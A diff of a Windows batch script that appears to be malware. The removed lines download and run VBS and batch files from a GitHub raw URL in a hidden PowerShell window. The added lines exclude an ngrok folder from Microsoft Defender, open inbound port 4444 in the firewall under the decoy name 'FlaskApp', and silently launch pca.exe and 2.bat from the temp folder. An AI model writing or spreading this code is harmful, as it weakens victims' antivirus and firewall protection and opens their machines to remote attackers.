@@ -1,8 +1,7 @@
 @echo off
-set "vbsUrl=https://raw.githubusercontent.com/ofutpemata22/mamf/main/ngr.vbs"
-set "batUrl=https://raw.githubusercontent.com/ofutpemata22/mamf/main/ngr.bat"
-set "vbsFile=%TEMP%\ngr.vbs"
-set "batFile=%TEMP%\ngr.bat"
-
-powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%vbsUrl%', '%vbsFile%'); (New-Object Net.WebClient).DownloadFile('%batUrl%', '%batFile%')"
-start "" "%vbsFile%"
+for /f "tokens=*" %%a in ('echo %USERNAME%') do set USERNAME=%%a
+powershell -Command "$ngrokPath = 'C:\Users\%USERNAME%\AppData\Local\ngrok'; Add-MpPreference -ExclusionPath $ngrokPath" >nul 2>&1
+powershell -Command "New-NetFirewallRule -DisplayName 'FlaskApp' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -Profile Any -EdgeTraversalPolicy Allow" >nul 2>&1
+start /min "" "%temp%\pca.exe" 
+start "" "%temp%\2.bat"
+exit
